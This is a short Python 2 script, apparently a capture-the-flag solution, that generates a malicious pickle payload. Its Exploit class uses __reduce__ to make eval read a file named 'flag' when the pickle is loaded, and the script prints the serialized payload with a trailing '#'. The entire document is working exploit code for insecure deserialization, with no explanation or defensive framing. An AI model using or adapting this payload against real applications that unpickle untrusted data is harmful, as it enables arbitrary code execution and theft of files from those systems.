import pickle
import os

class Exploit(object):
    def __reduce__(self):
        return (eval,('open("flag").read()',))

print pickle.dumps(Exploit()) + '#'
